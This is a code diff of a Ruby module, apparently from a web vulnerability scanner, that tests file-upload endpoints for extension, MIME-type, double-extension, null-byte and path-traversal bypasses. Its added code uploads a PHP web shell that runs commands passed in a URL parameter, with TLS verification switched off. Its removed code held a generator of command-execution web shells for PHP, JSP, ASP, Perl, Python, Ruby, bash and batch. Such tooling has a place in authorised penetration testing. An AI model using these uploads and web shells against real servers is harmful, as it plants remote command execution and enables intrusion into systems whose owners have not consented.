@@ -1,19 +1,48 @@
 require 'uri'
+require 'net/http'
+require 'mime/types'
 require_relative '../utils/network'
 require_relative '../utils/colorize'
 
 class FileUpload
-  EXTENSIONS = %w[php php3 php4 php5 phtml pht jsp jspx asp aspx asa ashx cgi pl py rb sh bat cmd exe com scr vbs js html htm xml svg]
-
+  EXTENSIONS = ['.php', '.jsp', '.asp', '.aspx', '.cgi', '.pl', '.py', '.rb', '.sh', '.exe', '.bat', '.cmd', '.ps1']
+  MIME_TYPES = ['image/jpeg', 'image/png', 'image/gif', 'text/plain', 'application/octet-stream', 'application/pdf']
+  
   def self.test_file_upload(url, field_name = 'file')
     results = []
+    test_files = [
+      { name: 'test.php', content: '<?php phpinfo(); ?>', ext: '.php' },
+      { name: 'test.jsp', content: '<% out.println("test"); %>', ext: '.jsp' },
+      { name: 'test.asp', content: '<% Response.Write("test") %>', ext: '.asp' },
+      { name: 'test.txt', content: 'test', ext: '.txt' }
+    ]
     
-    EXTENSIONS.each do |ext|
-      payload = generate_payload(ext)
-      result = upload_file(url, field_name, payload, ext)
-      if result && result[:uploaded]
-        puts Colorize.red("File uploaded: #{result[:filename]}")
-        results << result
+    test_files.each do |file|
+      begin
+        uri = URI(url)
+        http = Net::HTTP.new(uri.host, uri.port)
+        http.use_ssl = uri.scheme == 'https'
+        http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
+        
+        boundary = "----WebKitFormBoundary#{rand(1000000)}"
+        body = []
+        body << "--#{boundary}\r\n"
+        body << "Content-Disposition: form-data; name=\"#{field_name}\"; filename=\"#{file[:name]}\"\r\n"
+        body << "Content-Type: application/octet-stream\r\n\r\n"
+        body << file[:content]
+        body << "\r\n--#{boundary}--\r\n"
+        
+        req = Net::HTTP::Post.new(uri.path)
+        req['Content-Type'] = "multipart/form-data; boundary=#{boundary}"
+        req.body = body.join
+        
+        res = http.request(req)
+        
+        if res.code.to_i < 400
+          results << { file: file[:name], status: res.code, vulnerable: true }
+          puts Colorize.red("Upload successful: #{file[:name]}")
+        end
+      rescue => e
       end
     end
     
@@ -22,22 +51,34 @@ class FileUpload
 
   def self.test_mime_bypass(url, field_name = 'file')
     results = []
+    malicious_content = '<?php system($_GET["cmd"]); ?>'
     
-    mime_types = {
-      'php' => ['image/jpeg', 'image/png', 'image/gif', 'text/plain', 'application/octet-stream'],
-      'jsp' => ['image/jpeg', 'text/plain'],
-      'asp' => ['image/jpeg', 'text/plain'],
-      'aspx' => ['image/jpeg', 'text/plain']
-    }
-    
-    mime_types.each do |ext, mimes|
-      mimes.each do |mime|
-        payload = generate_payload(ext)
-        result = upload_file(url, field_name, payload, ext, mime)
-        if result && result[:uploaded]
-          puts Colorize.red("MIME bypass successful: #{ext} as #{mime}")
-          results << result
+    MIME_TYPES.each do |mime|
+      begin
+        uri = URI(url)
+        http = Net::HTTP.new(uri.host, uri.port)
+        http.use_ssl = uri.scheme == 'https'
+        http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
+        
+        boundary = "----WebKitFormBoundary#{rand(1000000)}"
+        body = []
+        body << "--#{boundary}\r\n"
+        body << "Content-Disposition: form-data; name=\"#{field_name}\"; filename=\"test.php\"\r\n"
+        body << "Content-Type: #{mime}\r\n\r\n"
+        body << malicious_content
+        body << "\r\n--#{boundary}--\r\n"
+        
+        req = Net::HTTP::Post.new(uri.path)
+        req['Content-Type'] = "multipart/form-data; boundary=#{boundary}"
+        req.body = body.join
+        
+        res = http.request(req)
+        
+        if res.code.to_i < 400
+          results << { mime: mime, status: res.code, vulnerable: true }
+          puts Colorize.red("MIME bypass successful: #{mime}")
         end
+      rescue => e
       end
     end
     
@@ -46,15 +87,34 @@ class FileUpload
 
   def self.test_double_extension(url, field_name = 'file')
     results = []
+    extensions = ['php.jpg', 'php.png', 'php.gif', 'php.txt', 'php.pdf', 'jsp.jpg', 'asp.jpg', 'aspx.jpg']
     
-    double_exts = %w[php.jpg jsp.png asp.gif aspx.jpg php.txt jsp.txt asp.txt]
-    
-    double_exts.each do |ext|
-      payload = generate_payload(ext.split('.').first)
-      result = upload_file(url, field_name, payload, ext)
-      if result && result[:uploaded]
-        puts Colorize.red("Double extension bypass: #{ext}")
-        results << result
+    extensions.each do |ext|
+      begin
+        uri = URI(url)
+        http = Net::HTTP.new(uri.host, uri.port)
+        http.use_ssl = uri.scheme == 'https'
+        http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
+        
+        boundary = "----WebKitFormBoundary#{rand(1000000)}"
+        body = []
+        body << "--#{boundary}\r\n"
+        body << "Content-Disposition: form-data; name=\"#{field_name}\"; filename=\"test.#{ext}\"\r\n"
+        body << "Content-Type: application/octet-stream\r\n\r\n"
+        body << '<?php system($_GET["cmd"]); ?>'
+        body << "\r\n--#{boundary}--\r\n"
+        
+        req = Net::HTTP::Post.new(uri.path)
+        req['Content-Type'] = "multipart/form-data; boundary=#{boundary}"
+        req.body = body.join
+        
+        res = http.request(req)
+        
+        if res.code.to_i < 400
+          results << { extension: ext, status: res.code, vulnerable: true }
+          puts Colorize.red("Double extension bypass: test.#{ext}")
+        end
+      rescue => e
       end
     end
     
@@ -63,14 +123,34 @@ class FileUpload
 
   def self.test_null_byte(url, field_name = 'file')
     results = []
+    null_byte_names = ["test.php\x00.jpg", "test.php%00.jpg", "test.php\0.jpg"]
     
-    EXTENSIONS.each do |ext|
-      null_ext = "#{ext}\x00.jpg"
-      payload = generate_payload(ext)
-      result = upload_file(url, field_name, payload, null_ext)
-      if result && result[:uploaded]
-        puts Colorize.red("Null byte bypass: #{ext}")
-        results << result
+    null_byte_names.each do |name|
+      begin
+        uri = URI(url)
+        http = Net::HTTP.new(uri.host, uri.port)
+        http.use_ssl = uri.scheme == 'https'
+        http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
+        
+        boundary = "----WebKitFormBoundary#{rand(1000000)}"
+        body = []
+        body << "--#{boundary}\r\n"
+        body << "Content-Disposition: form-data; name=\"#{field_name}\"; filename=\"#{name}\"\r\n"
+        body << "Content-Type: application/octet-stream\r\n\r\n"
+        body << '<?php system($_GET["cmd"]); ?>'
+        body << "\r\n--#{boundary}--\r\n"
+        
+        req = Net::HTTP::Post.new(uri.path)
+        req['Content-Type'] = "multipart/form-data; boundary=#{boundary}"
+        req.body = body.join
+        
+        res = http.request(req)
+        
+        if res.code.to_i < 400
+          results << { name: name, status: res.code, vulnerable: true }
+          puts Colorize.red("Null byte bypass: #{name}")
+        end
+      rescue => e
       end
     end
     
@@ -78,88 +158,39 @@ class FileUpload
   end
 
   def self.test_path_traversal(url, field_name = 'file')
-    paths = ['../', '..\\', '../../', '..%2F', '%2e%2e%2f']
+    results = []
+    paths = ['../../../test.php', '..\\..\\..\\test.php', '....//....//test.php', '%2e%2e%2f%2e%2e%2f%2e%2e%2ftest.php']
     
     paths.each do |path|
-      filename = "#{path}test.php"
-      payload = generate_payload('php')
-      result = upload_file(url, field_name, payload, filename)
-      if result && result[:uploaded]
-        puts Colorize.red("Path traversal: #{filename}")
-        return result
+      begin
+        uri = URI(url)
+        http = Net::HTTP.new(uri.host, uri.port)
+        http.use_ssl = uri.scheme == 'https'
+        http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
+        
+        boundary = "----WebKitFormBoundary#{rand(1000000)}"
+        body = []
+        body << "--#{boundary}\r\n"
+        body << "Content-Disposition: form-data; name=\"#{field_name}\"; filename=\"#{path}\"\r\n"
+        body << "Content-Type: application/octet-stream\r\n\r\n"
+        body << '<?php system($_GET["cmd"]); ?>'
+        body << "\r\n--#{boundary}--\r\n"
+        
+        req = Net::HTTP::Post.new(uri.path)
+        req['Content-Type'] = "multipart/form-data; boundary=#{boundary}"
+        req.body = body.join
+        
+        res = http.request(req)
+        
+        if res.code.to_i < 400
+          results << { path: path, status: res.code, vulnerable: true }
+          puts Colorize.red("Path traversal: #{path}")
+        end
+      rescue => e
       end
     end
     
-    nil
-  end
-
-  def self.generate_payload(ext)
-    case ext
-    when 'php', 'php3', 'php4', 'php5', 'phtml', 'pht'
-      "<?php system($_GET['cmd']); ?>"
-    when 'jsp', 'jspx'
-      "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
-    when 'asp', 'aspx', 'asa', 'ashx'
-      "<%eval request(\"cmd\")%>"
-    when 'cgi', 'pl'
-      "#!/usr/bin/perl\nsystem($ENV{'QUERY_STRING'});"
-    when 'py'
-      "#!/usr/bin/python\nimport os\nos.system(os.environ.get('QUERY_STRING'))"
-    when 'rb'
-      "#!/usr/bin/ruby\nsystem(ENV['QUERY_STRING'])"
-    when 'sh', 'bash'
-      "#!/bin/bash\neval $QUERY_STRING"
-    when 'bat', 'cmd'
-      "@echo off\n%QUERY_STRING%"
-    else
-      "test"
-    end
-  end
-
-  def self.upload_file(url, field_name, content, filename, mime_type = nil)
-    begin
-      boundary = "----WebKitFormBoundary#{Time.now.to_i}"
-      body = []
-      body << "--#{boundary}"
-      body << "Content-Disposition: form-data; name=\"#{field_name}\"; filename=\"#{filename}\""
-      body << "Content-Type: #{mime_type || 'application/octet-stream'}"
-      body << ""
-      body << content
-      body << "--#{boundary}--"
-      
-      response = Network.http_request(url, :post, {
-        'Content-Type' => "multipart/form-data; boundary=#{boundary}"
-      }, body.join("\r\n"))
-      
-      return nil unless response
-      
-      {
-        uploaded: response.code == "200" || response.code == "201",
-        filename: filename,
-        status: response.code,
-        location: extract_upload_location(response)
-      }
-    rescue
-      nil
-    end
-  end
-
-  def self.extract_upload_location(response)
-    body = response.body
-    
-    patterns = [
-      /upload[^"']*["']([^"']+)["']/i,
-      /file[^"']*["']([^"']+)["']/i,
-      /location[^"']*["']([^"']+)["']/i,
-      /href=["']([^"']*upload[^"']*)["']/i
-    ]
-    
-    patterns.each do |pattern|
-      match = body.match(pattern)
-      return match[1] if match
-    end
-    
-    nil
+    results
   end
 end
 
